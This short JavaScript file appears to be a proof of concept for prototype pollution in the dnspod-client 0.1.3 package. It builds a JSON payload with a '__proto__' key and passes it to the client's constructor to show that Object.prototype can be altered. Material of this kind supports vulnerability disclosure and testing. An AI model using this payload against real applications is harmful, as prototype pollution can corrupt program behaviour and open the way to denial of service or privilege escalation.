const Dnspod = require('./dnspod-client@0.1.3')
const payload = JSON.parse('{"__proto__": {"polluted": {"prop": 1}}}');

Object.prototype._polluted = {};
new Dnspod(payload);